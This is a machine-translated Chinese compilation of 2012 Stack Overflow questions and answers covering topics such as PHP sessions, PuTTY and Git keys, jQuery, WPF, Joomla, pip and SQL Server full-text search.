我目前`https://graph.facebook.com/PROFILE_ID/picture`用于显示用户的 Facebook 个人资料图片。在某些情况下，我不得不一次显示数百个，使用上述方法会导致延迟。我可以使用的一个选项是每次用户与我的网站交互时将个人资料图片下载到我的 CDN。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:37:56.293

也许你可以使用 facebook[批量请求](https://developers.facebook.com/docs/reference/api/batch/)

# iphone - 如何检查是否已调用此方法？

> ID：10514332
> 
> 赞同：1
> 
> 时间：2012-05-09T10:33:21.927
> 
> 标签：iphone, objective-c, ios

如何检查是否已调用此方法（或者状态是否为真）？

```
 [self.view addSubview:menu]; 
```

我需要编写一个条件语句来测试这是否为真：

```
[self.view addSubview:menu]; 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T10:35:44.080

菜单是视图吗？

所以，

```
if (menu.superview == self.view) 
```

将测试是否根据需要添加了菜单

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:34:41.563

```
if(menu.superview == aSpecificView)
// if true then menu is added as subview 
```

如果您想检查特定视图，请执行此操作

```
if(menu.superview==aSpecificView)
 //do code here 
```

# php - 在mac os中关闭浏览器时如何销毁会话？

> ID：10514348
> 
> 赞同：0
> 
> 时间：2012-05-09T10:34:48.527
> 
> 标签：php, session, session-cookies

我正在研究 php 项目。我只想这样做，当我关闭浏览器时，取消设置或销毁会话。

这里我也试过

ini_set('session.cookie_lifetime', 0) 和 session_set_cookie_params(0) 在 session_start() 之前；

它在 Windows 操作系统中运行良好，但在 MAC 操作系统中运行良好。

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T10:40:34.813

一个会话有两个部分。

1.  存储在服务器上的数据
2.  客户端上带有会话 id 的 cookie

当浏览器关闭时，没有可靠的方法来删除服务器上的数据。每个健全的会话系统只是定期清理旧数据（如果 N 分钟内没有关联浏览器的迹象）。

浏览器上的cookie通常是没有过期时间发送的，这意味着浏览器退出时它就会过期。这工作可靠。

如果您在 Windows 客户端上做任何您想做的事，那么我会假设您正在谈论使 cookie 过期。

这将在 Mac 和 Windows 上发生。我最好的猜测是你的测试有问题。在 Windows 上，应用程序通常在最后一个窗口关闭时退出。在 Mac 上，应用程序通常要求您明确退出它们，但如果您只是关闭最后一个窗口，则保持打开状态。

为确保 cookie 过期，您必须明确退出浏览器（通过从菜单中选择退出或右键单击并在 Dock 中的图标上选择退出）。

服务器无法检测到最后一个窗口何时关闭并远程终止会话。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T10:41:16.960

> 它在 Windows 中运行良好

这或多或少意味着它有效。

> 但不适用于 MAC 操作系统

这大概是个误会。您需要关闭*所有*浏览器窗口，浏览器才能销毁会话 cookie。很可能您只关闭了多个窗口中的一个，并且至少有一个浏览器实例仍然存在（您可以`top`在终端窗口中检查这种情况）。

# git - Puttygen RSA 密钥在 Windows 上与命令行 git 一起使用

> ID：10514349
> 
> 赞同：1
> 
> 时间：2012-05-09T10:34:50.740
> 
> 标签：git, putty, ssh-keys, openssh, tortoisegit

问题：当我尝试使用 puttygen 生成的 ssh2-RSA 密钥和命令行 git 工具时，密钥被拒绝。

详细信息：我的电脑（以及 msysgit）上安装了 TortoiseGit。TortoiseGit 设置为使用 PuttyGen 生成它的密钥。当我尝试在命令行 git 工具中使用 PuttyGen 生成的密钥之一时，它会拒绝公钥，并且在某些情况下会要求输入密码，即使密钥没有。我在多台计算机（都运行 Windows 7 x64）上遇到过这个问题，知道如何解决这个问题，所以我不必为我的 cmd 行客户端和 TortoiseGit 设置单独的键吗？

TortoiseGit 设置为从推送对话框中为每个 repo 自动加载一个 putty 密钥可能也很有趣。当我运行 ssh -v git@github.com 时，它正确地找到了密钥，但是当它尝试连接时，它被拒绝说密钥错误。如果我使用 ssh-keygen 制作的密钥，它就可以正常工作。

软件版本：MsysGit 1.7.7.1 SSH 4.6p1 PuttyGen 0.61 Tortise 1.7.5.0

感谢您的帮助（如果这是错误的交换，请告诉我，以便我可以关闭并快速移动它）Eric Fode

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T10:48:44.430

[这个](https://stackoverflow.com/questions/2224066/how-to-convert-ssh-keypairs-generated-using-puttygenwindows-into-key-pairs-use)的副本。简而言之：PuTTY（属于其中`puttygen`的一部分）和 OpenSSH（属于其中`ssh-keygen`的一部分）使用不同的格式来存储其密钥，您必须坚持使用其中一种或执行转换。

就个人而言，我已经将 Git 设置`plink.exe`为它的 SSH 代理，并通过`pageant`PuTTY 的`ssh-agent`.

说得更清楚一点：适用于 Windows 的 Git 捆绑了 OpenSSH，但它并没有与之绑定，并且如果被告知这样做，它可以愉快地使用 PuTTY。每个人都可以在这里选择他们的选择。我认为如果系统中安装了 PuTTY 或被其他工具使用（看起来像你的情况），那么让 Git 使用 PuTTY 是一个自然的选择。

# sharepoint - 是否可以在共享点服务器上更改 feature.xml 和 elements.xml 的文件名？

> ID：10514357
> 
> 赞同：0
> 
> 时间：2012-05-09T10:35:49.100
> 
> 标签：sharepoint, moss

是否可以在共享点服务器上更改 feature.xml 和 elements.xml 的文件名？如果是这样，怎么做？

谢谢

问候普拉桑特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T11:22:44.137

据我所知，您无法更改 feature.xml 文件的名称。但是，您可以更改 elements.xml 的名称。如果更改elements.xml 的名称，则必须在相应的feature.xml 中更改对该文件的引用。

# ajax - 无法从 ajax 调用的 servlet 转发到另一个 jsp

> ID：10514359
> 
> 赞同：1
> 
> 时间：2012-05-09T10:35:54.543
> 
> 标签：ajax, servlets

我正在使用 ajax 代码调用 servlet

```
$.ajax({
                url: 'servletName',
                data: {
                    userID: selectedID
                },
                type: 'post'
            }); 
```

我可以打印 servlet 中的值，但我不能转发到另一个 jsp .....servlet 代码是

```
id = request.getParameter("userID");
System.out.println("Selected ID : "+id);

request.setAttribute("newID", id);

RequestDispatcher rd = request.getRequestDispatcher("/newpage.jsp");
rd.forward(request, response); 
```

如果我从表单提交按钮调用这个 servlet，它就可以工作。但它不会从 ajax 代码转发到另一个 JSP。有什么不同的方法吗？？？？谁能帮忙

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T11:15:42.650

在`$.ajax`中，添加：

```
dataType: 'text' 
```

在成功部分，添加以下内容：

```
var url = "(your url)";  
$(location).attr('href', url); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-20T05:09:05.823

您需要了解这样一个事实，即当您从 ajax 发送 http 请求时，这意味着您是在主线程之外的单独线程中发送请求（您发送请求的页面本身）。因此 servlet 的重定向不会反映在客户端。为了实现这一点，发送回您想要重定向到的 URL 作为对请求的响应，并且在 ajax 的成功方法上只需使用 java 脚本 window.location(URL);

在 servlet

```
JSONObject jobj = new JSONObject()
String urlToRedirect = "test.jsp";
jobj.put("url",urlStr);
response.getWriter().write(jobj.toString()); 
```

在客户端

```
$.ajax({
                url: 'servletName',
                data: {
                    userID: selectedID
                },
                type: 'post',
                success: function(data){
                  window.location = data.url;
                } 

            }); 
```

# php - joomla 在视图之间传递变量

> ID：10514363
> 
> 赞同：1
> 
> 时间：2012-05-09T10:36:01.223
> 
> 标签：php, model-view-controller, joomla, joomla-extensions, joomla-component

我正在编写一个 joomla 组件，该组件将有一个用于注册的多步骤表单，第一个包含 2 个单选按钮。将变量从单选按钮传递到步骤 2 的最简单方法是什么？当用户提交第一个表单时，控制器被调用以显示第二步，有没有更简单的方法呢？提前致谢。

代码：

step1 表单（查看代码）：

```
<form name="step1" action="<?php echo JRoute::_('index.php option=com_mycomponent&task=mycomponent.register'); ?>" method="POST">
<input type="radio" name="placement" value="0" checked /> Option 1<br />
<input type="radio" name="placement" value="1" /> Option 2<br />
<div class="next" onClick="document.forms['step1'].submit();"></div>
</form> 
```

处理 mycomponent.register 的控制器代码

```
class mycomponentControllermycomponent extends JController

{

    public function register()

    {
    $this->setRedirect(JRoute::_('index.php?option=com_mycomponent&view=default&layout=step2', false));
    }

} 
```

我想将值从收音机传递到 step2 ;)

希望我没有错过一个关于这个的话题，至少找不到一个！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:01:23.023

在 register 方法中，您可以访问单选值，然后将其通过链接传递给您的视图：

```
 public function register()
    {
        $placementOption = JRequest::getInt('placement', 0, 'post');

    $this->setRedirect(JRoute::_('index.php?option=com_mycomponent&view=default&layout=step2&placement=' . $placementOption, false));
    } 
```

在您对第 2 步 (view.html.php) 的看法中，您可以以相同的方式访问该选项（这次的值是 GET 而不是 POST）：

```
$placementOption = JRequest::getInt('placement', 0, 'get');

$this->assignRef('placement', $placementOption); 
```

最后，如果您想在视图模板中访问它（例如 default.php）

```
<?php echo $this->placement; ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-18T10:25:22.673

我刚刚在 Joomla 中解决了类似的问题。我所做的很简单，而且效果很好。

1）我在文章的html编辑器中创建了一篇带有表单的文章。

2）在这篇文章的html代码中，对于表单我给了form method="POST" action="child.php"。

3) 现在，child.php 是我的 joomla 安装文件夹中的一个页面，它有一个与我的模板布局、链接和文章等完全相同的 html 页面。所以，我将 child.php 设置为一个看起来与我网站上的任何其他页面一样的页面，而且里面还有一个表格。

4）在这个child.php里面有一个表格。然后我想用里面的表单从文章中填充的字段我给了 value="?php echo $_POST['VARIABLE']; ?"，其中 VARIABLE 是我的 html 表单文章的字段名称。

所以，就是这样，现在我的文章 html 表单将我重定向到 child.php 页面，并且 child.php 填充了我之前的 html 文章的变量。

# paypal - 为贝宝购物车生成唯一 ID

> ID：10514364
> 
> 赞同：0
> 
> 时间：2012-05-09T10:36:04.673
> 
> 标签：paypal

我将使用这个似乎可以满足我需要的 php 购物：

[http://v3.thewatchmakerproject.com/journal/276/](http://v3.thewatchmakerproject.com/journal/276/)

结帐时，我将使用此方法：

将购物车总金额传递给 PayPal（贝宝网站）。

在我的购物车中，我保存了额外的字段，我想在交易完成时发送给卖家，ipn 脚本验证付款是否完成。该脚本还将更新该表。

我的疑问与如何跟踪买家交易有关。如何为我的交易生成一个唯一 ID，用于：

1.  更新所有项目的状态
2.  选择所有信息并发送给买家。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:50:34.630

我会实现一个令牌功能，例如

```
$token = md5(date('YmdhisYmdhis').$user->id));
$token = md5($token; 
```

这样你就有了一个生成的字符串，这个字符串对于每个用户来说都是唯一的，当他做一个新的购物车时

**explenation** 我取了两次日期，然后附加用户 ID 并从中制作一个 md5 字符串

如果您没有用户使用 session_id()

# iphone - 处理不同类的http请求

> ID：10514371
> 
> 赞同：0
> 
> 时间：2012-05-09T10:36:27.790
> 
> 标签：iphone, objective-c, ios5, handle, nsurlrequest

我正在尝试创建一个包含不同方法的类，这些方法中的每一个都将执行一些 http 请求操作并将结果返回给调用者方法。

例如：

```
UserOperations *op = [[UserOperations alloc] init];
int age = [op getUserAge]; 
```

该方法`"getUserAge"`将调用 Web 服务并进行一些 xml 解析以将值（年龄）返回给调用者。

实现它的最佳和正确方法是什么。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:42:40.753

你需要在`delegate`这里实现模式。

`Protocols and delegates`在 iOS 中查看。请访问[此处](http://mobiledevelopertips.com/objective-c/the-basics-of-protocols-and-delegates.html)和[Apple 文档](http://developer.apple.com/mac/library/documentation/Cocoa/Conceptual/ObjectiveC/Articles/ocProtocols.html#//apple%5Fref/doc/uid/TP30001163-CH15-SW1)

[而且，还可以在这里](https://stackoverflow.com/questions/1978621/nsoperation-and-nsoperationqueue-callback)看到关于 SO 的类似问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:43:14.357

对于每个 web 服务，您都应该将其与控制器分开，然后将控制器与 UI 类分开。

像

UILayer //调用控制器类的方法并传递viewController的委托和最后要返回的选择器

控制层 // 获取数据以及委托给 UIlayer 和选择器给 uiLayer，并调用 web 服务

Webservice 层 // 从控制层接收数据，从服务器调用 web 服务，获取响应并连同它的委托（webservice）传递给解析器层

Parser Layer // 从 webervice 层获取数据并解析

///////////////////////////////////////// ////

现在你要回去了

// webservice 层存储了委托和选择器一起发送给 UI 层，解析响应的数据后，它将使用解析的数据调用 UILayer。

// ui层将显示/处理它

# javascript - 修改事件处理程序的触发事件

> ID：10514372
> 
> 赞同：-4
> 
> 时间：2012-05-09T10:36:31.040
> 
> 标签：javascript, jquery, javascript-events

我想通过 jQuery 更改一组事件处理程序的触发事件。

例如，如果我有：

```
<div id=abc>Hello world</div> 
```

和

```
$("#abc").on("mouseover",alert); 
```

有没有办法将`mouseover`事件重新分配给`mousemove`？请注意，它不应保留原始`mousemove`事件。

（我希望能够通过用户脚本修改站点上对象的行为）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:38:53.750

我相当确定它就像这样简单：

```
$("#abc").mouseover($("#abc").mouseout); 
```

* * *

事实证明，这实际上并没有那么简单。你要这个：

```
$("#abc").data("events")["mouseover"][0].handler; 
```

# wpf - 选择组合框项目时启用文本框

> ID：10514375
> 
> 赞同：5
> 
> 时间：2012-05-09T10:36:57.137
> 
> 标签：wpf, wpf-controls

我想在选择 comboboxitem 时启用文本框。请注意，组合框项目未定义，而是我使用组合框中的项目源来获取组合框项目列表。我想在选择组合框项目时更改文本框的属性。

（粘贴到原始问题的评论）

```
<DataTrigger Binding="{Binding ElementName=cmbInstrumentType,
              Path=SelectedIndex}" 
              Value="1" >
    <Setter Property="IsEnabled" Value="true" />
    <Setter Property="Background" Value="White" /> 
 </DataTrigger> 
```

我只希望它在 XAML 中而不是在后面的代码中。我不想对每个索引值都重复这一点——

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-09T13:20:49.787

尽管*更好*的方法是使用 MVVM 模式并绑定到 ViewModel 中的属性（如 Dabblenl 建议的那样），但我认为您可以像这样实现您想要的：

```
 <StackPanel>
        <ComboBox ItemsSource="{Binding Items}" Name="cmbInstrumentType"/>
        <TextBox>
            <TextBox.Style>
                <Style TargetType="TextBox">
                    <Style.Triggers>
                        <DataTrigger Binding="{Binding ElementName=cmbInstrumentType, Path=SelectedItem}" Value="{x:Null}">
                            <Setter Property="IsEnabled" Value="False"/>
                        </DataTrigger>
                    </Style.Triggers>
                </Style>
            </TextBox.Style>
        </TextBox>
    </StackPanel> 
```

如果在组合框中未选择任何项目，这将禁用文本框。

**编辑：**扩展的代码片段

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-05-25T13:27:50.313

我认为做这种事情的最好方法是使用转换器，所以你不必用处理它的样式污染视图，并且逻辑不在视图中

像这样的东西

```
IsEnabled="{Binding ElementName=cboVersion, Path=SelectedItem, Converter={StaticResource ObjectToBoolConverter}}" 
```

当然你需要 ObjectToBool 转换器，像这样（非常简单，没有类型检查等......并且应该改进）

```
public class ObjectToBoolConverter : IValueConverter {
  public object Convert(object value, Type targetType, object parameter, CultureInfo culture) {
     return value != null;
  }

  public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture) {
     throw new NotImplementedException();
  } 
```

}

并记住在您的资源字典中注册转换器，例如

```
<Converters:ObjectToBoolConverter x:Key="ObjectToBoolConverter"/> 
```

# c# - 如何在函数中保存参数字符串？

> ID：10514381
> 
> 赞同：-4
> 
> 时间：2012-05-09T10:37:38.940
> 
> 标签：c#, windows, string, params

我想将字符串存储在程序中以便以后使用它，并且还想显示输入了哪些字符串。代码看起来像这样

```
 public static void UseParam(params string[] list)
    {
        for (int i = 0; i < list.Length; i++)
        {
            MessageBox.Show(list[i].ToString());
        }
    } 
```

...

```
UseParam("1", " two thre", "four"); 
```

为什么该代码不想显示我输入的字符串？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:52:35.657

如果你说的是真的。听起来你想要一个全球列表

只需在主表单构造函数上方声明

```
 public list<string> myList=new list<string>()

 public Form1()//main form declaration
    {
        InitializeComponent();
    } 
```

然后您可以在主窗体中的任何位置使用它。

```
Button1_Click()
{
     MessageBox.Show(myList[0]);
} 
```

如果您想以多种形式使用它，请在项目中添加一个类

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace myNameSpace//use your namespace
{
    public class Tools  //I like the name tools  
    {
        public static myList<string> myList=new list<string>();
    }
} 
```

然后使用它调用

```
Tools.myList.Add("1"); 
```

或者

```
MessageBox.Show(Tools.myList[0]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:54:07.283

哦，我想我理解你。

您需要在应用程序的范围内定义一个变量。在这种情况下，它将是一个字符串列表 ( `List<string>`)。您必须在构造函数中对其进行初始化，然后`.Add(list[i])`在过程中调用。然后您可以稍后在您的应用程序中重用这些字符串。

# javascript - 如何将 jquery 代码动态注入 HTML 页面

> ID：10514383
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:01.630
> 
> 标签：javascript, jquery

我想添加一个 javascript 代码，我从服务器获取到我的视图。

这可能吗 。

我在做这个

```
 jQuery(".city").change(function(){

        var address = jQuery('#business-address').val();
        var city = jQuery('.city').val();
        var state = jQuery('.state').val();
        var country = jQuery('.country').val();

        var address_string = address+","+city+","+state+","+country;

        jQuery.ajax({
              type: "post",
              url: baseurl+"home/auth/create_google_map_from_address",
              data:{address:address_string},
              success: function(data,status){

                  var data_array = JSON.parse(data);                  

                  var latitude = data_array['map']['markers']['marker_0'].latitude;
                  var longitude = data_array['map']['markers']['marker_0'].longitude;
                  var map_js = data_array['map'].js;
                  var map_html = data_array['map'].html;
                  alert(latitude);

                  jQuery('#gmap_js').html(map_js);

              } 
         });
    }); 
```

我正在获取变量的 javasript 代码`map_js`

我想将此代码添加到 html 页面，

目前我正在使用`jQuery('#gmap_js').html(map_js);`

但它不工作，如何做到这一点。

这是 map_js

![在此处输入图像描述](../Images/4d7ee73edc7f53ab6c2941ccaf780a79.png)

请帮忙...........

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T10:57:08.763

您可以这样做，让您在需要的地方使用转义字符反斜杠 \，正如您将在[示例代码](http://jsfiddle.net/BRWg6/)中看到的那样。

```
var map_js = '<script language="javascript" type="text\/javascript"> alert("Js");<\/script>'

jQuery('head').append(map_js); 
```

​</p>

# c# - c#中使用数据库中数据的折线图

> ID：10514384
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:02.590
> 
> 标签：c#, line

我想在 c# windows 应用程序中绘制一条线 ghraph。其中 X 轴具有日期值和 Y 轴具有整数/双精度值（例如“项目率”）值。＆我可以从触发一些查询的数据库中获取这些数据。我如何绘制这些日期和费率组合的折线图？？？？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-09T10:40:15.210

你可以使用[微软图表控件](http://www.codeproject.com/Articles/31397/New-Microsoft-Chart-Controls-for-Web-and-Windows-F)

[样品](http://archive.msdn.microsoft.com/mschart/Release/ProjectReleases.aspx?ReleaseId=4418)

[入门](http://msdn.microsoft.com/en-us/library/dd456753.aspx)

[折线图设置](http://msdn.microsoft.com/en-us/library/dd489252.aspx)

如果您也在探索商业图书馆，您可以使用[Xceed 图表控件](http://xceed.com/Chart_WinForms_Intro.html)。Xceed 库非常易于使用，并且可以立即产生精彩的效果。

# eclipse - Eclipse - 在 Eclipse 关闭/退出时运行任务

> ID：10514385
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:10.523
> 
> 标签：eclipse, eclipse-plugin

eclipse关闭时是否可以自动运行任务/脚本？

我在首选项中找不到合适的选项，也找不到可以帮助解决此问题的插件。

我使用 Eclipse 的 perforce 插件，我想在 eclipse 关闭之前自动运行一个[架子任务。](http://www.perforce.com/perforce/doc.current/manuals/p4v/Shelving.html)

非常感谢萨沙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T21:49:47.730

您最好的选择是使用框架适配器挂钩。这允许您以比 Eclipse 插件稍低的级别插入 OSGi 运行时。本质上，框架适配器钩子是实现`org.eclipse.osgi.baseadaptor.hooks.AdaptorHook`接口的插件片段。这个接口有一个`frameworkStop`and`frameworkStopping`方法，你可以实现并且可能在你需要的时候运行。

这是关于适配器钩子的一些很好的信息[http://wiki.eclipse.org/Adaptor_Hooks](http://wiki.eclipse.org/Adaptor_Hooks)

# sql - 协助 SQL 函数

> ID：10514388
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:16.217
> 
> 标签：sql, function, join

上周我得到了一个涉及函数的 SQL 实验室。在这个实验室之前，我对 SQL 的了解充其量是最少的，我很难理解一个特定的功能。

四张表：

![在此处输入图像描述](../Images/4117575dd97025dfadd2c275c1cc590c.png)

我将创建一个名为 teamsize 的存储函数，它返回特定年份的给定球队名称中的球员人数。团队名称将作为传递给函数的参数提供。据我所知，需要加入，但这就是我所知道的一切。

我尝试了什么：

![在此处输入图像描述](../Images/a768c089e68d500d3389df38d40f6e31.png)

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:43:50.520

你需要试一试。你的主桌是团队，所以你必须

```
select 
from team 
where Team1.teamID = your_parameter and Team1.year = your_year 
```

由于您不需要有关球员的详细信息，只需数量，您可以将 Team1 表与 playerTeam1 连接起来，并使用计数功能计算记录数。

如果您需要玩家的详细信息，则需要加入其他表，但由于没有必要，您可以使用我提到的仅有的 2 张表。

# facebook-graph-api - enable_profile_selector 与 FB javascript SDK

> ID：10514391
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:47.653
> 
> 标签：facebook-graph-api

关于此信息：http: [//developers.facebook.com/docs/reference/rest/stream.publish](http://developers.facebook.com/docs/reference/rest/stream.publish)

参数：target_id 和 uid 描述说：

如果我想作为页面发布，我应该使用 FB.login 的“enable_profile_selector”选项。此选项在权限对话框中启用配置文件选择器。据我了解 enable_profile_selector 这不是权限，而是将其作为 GET 参数发送，然后当用户被询问权限时，他可以选择个人资料，如果我是 facebook 页面管理员，那么我可以选择页面页面个人资料。

所以基本上问题是在哪里启用'enable_profile_selector'以及如何使用javascript sdk传递“enable_profile_selector”参数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-14T01:40:22.980

无论如何，我想在这里获取页面访问令牌。所以我使用了这种方法 [https://developers.facebook.com/docs/authentication/pages/](https://developers.facebook.com/docs/authentication/pages/)

# jquery - jquery循环和复制类到父

> ID：10514392
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:51.953
> 
> 标签：jquery, arrays, loops, copy

我有很多动态生成的盒子。像这样，

```
<div id="container">

<div class="element">
<div class="1"></div><div class="2"></div>
<div id="star"><div class="flexy threestar price100 city"></div>
<div class="3"></div><div class="4"></div>
</div>

<div class="element">
<div class="1"></div><div class="2"></div>
<div id="star"><div class="flexy fourstar price300 suburb"></div>
<div class="3"></div><div class="4"></div>
</div>

</div> 
```

现在我正在尝试遍历所有框并尝试将 .flexy 复制到父类 .element

所以我用

```
$( "div.flexy" ).each ( function( ){
$('.element').toggleClass($(this).attr('class'));

//alert( $('div.element').attr('class') );

} 
); 
```

第一次复制工作，之后我上了双班。如何克服这个问题？.element 的结果应该是某事。像

```
<div class="element flexy fourstar price300 suburb">
  <div class="1"></div><div class="2"></div>
    <div id="star"><div class="flexy fourstar price300 suburb"></div>
  <div class="3"></div><div class="4"></div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:44:38.307

怎么样：

```
var num = 0;
$( "div.flexy" ).each ( function( ){

$('.element').eq(num).toggleClass($(this).attr('class'));
num++

} 
); 
```

或者

```
$( "div.flexy" ).each ( function( ){

$(this).parent(".element").toggleClass($(this).attr('class'));

} 
); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:45:00.817

如果副本的目标与下一个副本的选择位于同一部分，那么下次您将获得双打。

你可以：

1.  复制到不同的部分，没有被复制选择选中

2.  向元素添加一个类，并在复制选择中排除 thise

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T10:53:40.360

简单地尝试

```
$("div.flexy").each(function(){
  $this = $(this);
  $this.closest('.element').addClass($this.attr('class')); 
}); 
```

# pip - 克隆/签出存储库后如何自动提出 pip 安装要求？

> ID：10514395
> 
> 赞同：0
> 
> 时间：2012-05-09T10:38:57.350
> 
> 标签：pip

好吧，现在我应该这样做：

```
# pip install git+<my repository url>#egg=foo
# cd src/foo
# pip install -r requirements.txt 
```

如何让 pip 自动安装要求。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-12T07:08:22.477

我发现你可以在 setup.py 中使用 install_requires：

```
setup(name = 'foo',
      ...
      install_requires = ['bar', 'blah', 'blah2']) 
```

但我仍然想知道是否有办法自动将结果

```
pip freeze 
```

作为 setup.py 中的 install_requires。

# html - CSS：将垂直菜单转换为水平菜单

> ID：10514398
> 
> 赞同：1
> 
> 时间：2012-05-09T10:39:15.543
> 
> 标签：html, css, menu

如何将垂直菜单转换为水平菜单？下面给出的代码中的哪些行对此负责？

```
ul#vertmenu {
    list-style: none outside none;
    margin: 0;
    padding: 0;
    width: 200px;
}
ul#vertmenu li {
    background: none repeat scroll 0 0 #FFFFFF;
    border-bottom: 1px solid #FFFFFF;
    float: left;
    font: bold 11px/16px arial,helvetica,sans-serif;
    position: relative;
    width: 100%;
}
ul#vertmenu li ul li {
    background: none repeat scroll 0 0 #FFCF8B;
}
ul#vertmenu li a {
    display: block;
    padding: 2px 3px;
}
ul#vertmenu li a:hover {
    background: none repeat scroll 0 0 #FFCF8B;
    border-left: 1px solid #FFFFFF;
    border-right: 1px solid #FFFFFF;
    color: #AA0000;
}
ul#vertmenu li ul li a:hover {
    background: none repeat scroll 0 0 #FFEDD3;
    border-left: 1px solid #FFFFFF;
}
ul#vertmenu ul {
    display: none;
    position: absolute;
    top: 0;
}
ul#vertmenu li:hover ul {
    display: block;
    left: 200px;
} 
```

[我在这里](http://www.dynamicdrive.com/forums/archive/index.php/t-30960.html)找到了答案。正是我想知道的：

“首先，去掉所有提到的“宽度”。你会希望你的菜单跨越你的页面，而不是在当前版本中限制为 180 像素。

接下来，我们需要告诉

*   元素彼此对齐，而不是从上到下堆叠。因此，将 display:inline 添加到#vertmenu li。

    之后，我们需要告诉元素效仿。因此，从#vertmenu li a decleration 中删除 display:block。"

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:41:42.613

更改`display:block;`为

```
 display:inline; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T10:53:12.920

尝试添加

```
li
{
display:inline;
} 
```

也在你的代码中

```
 ul#vertmenu li {
    background: none repeat scroll 0 0 #FFFFFF;
    border-bottom: 1px solid #FFFFFF;
    float: left;
    font: bold 11px/16px arial,helvetica,sans-serif;
    position: relative;
    width: 100%;
} 
```

在这里你设置`li`宽度`ul`。删除它。

简单的[例子](http://jsfiddle.net/Ly8Um/3/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-23T01:46:32.287

**将列表的样式更改**为（例如：无序），您也可以使用该列表的类或 id 设置样式。

```
ul{
        white-space: nowrap;
        overflow-x: auto;  
    } 
```

并将**li 的样式**更改为**inline-block**

```
li{
    display: inline-block;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-10-10T08:47:31.637

```
li {
  display: inline;
} 
```

而不是全部显示：内联尝试隔离。

# qt - Qt Instances ID 在每次运行时更改

> ID：10514400
> 
> 赞同：1
> 
> 时间：2012-05-09T10:39:26.693
> 
> 标签：qt, testing, automation, ui-automation

我正在使用 Qt 测试应用程序。

我正在研究做一些自动化测试，唯一的问题是，据我所知，无论是编程（使用 AutoIT）还是使用其他套件，每次运行时对象的实例都会发生变化。因此，例如，如果在 run#1 按钮“Next”在 run#2 处具有实例 0002，它可能具有 0004。

这使得不可能有一个不依赖于单纯的屏幕坐标的自动化（有明显的缺点）。

一种方法是改用文本/标题，但有时某些对象可能根本没有，或者不是唯一的。

任何建议都非常感谢！

提前致谢。

N。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:36:49.070

你应该看看[QTestLib](http://qt-project.org/doc/qt-4.8/qtestlib-manual.html)：

> 诺基亚提供的 QTestLib 框架是用于对基于 Qt 的应用程序和库进行单元测试的工具。QTestLib 提供了单元测试框架中常见的所有功能以及用于测试图形用户界面的扩展。

它添加了`QTest`包含几个用于测试 QtGui 应用程序的函数的命名空间，包括：

*   [`keyClick`](http://qt-project.org/doc/qt-4.8/qtest.html#keyClick)- 发送键盘键
*   [`mouseClick`](http://qt-project.org/doc/qt-4.8/qtest.html#mouseClick)- 发送鼠标点击
*   [`qWaitForWindowShown`](http://qt-project.org/doc/qt-4.8/qtest.html#qWaitForWindowShown)- 等待一个窗口出现

# sql-server-2008 - 减少全文搜索结果中重复词的权重

> ID：10514405
> 
> 赞同：0
> 
> 时间：2012-05-09T10:39:52.877
> 
> 标签：sql-server-2008, full-text-search

我已经在 Sql Server 2008 表之一上实现了全文搜索。我正在使用包含表查询来获取结果并根据排名对其进行排序。

例子

```
SELECT Ad_text.*, k.rank
FROM Ad_text
INNER JOIN CONTAINSTABLE(Ad_text, text, 'Wanted or Engineers or bride') k
ON Ad_text.id = k.[KEY] order by rank desc 
```

现在，当查询返回结果时，它将那些具有高频率的任何这些单词的行排名更高，因为我希望这些行排名更高，其中包含所有这些单词。

Like查询会以这种方式返回结果

1.  通缉 通缉新郎（等级 200）
2.  招聘工程师（等级 180）
3.  工程师等级通缉新娘（190）

我希望第三个排名更高。有什么可以告诉 containstable 不会增加重复文本的权重。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T04:46:03.897

发现一种解决方法已使用 FreeTextSearch 及其记录数功能。它解决了目的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-08T06:23:52.463

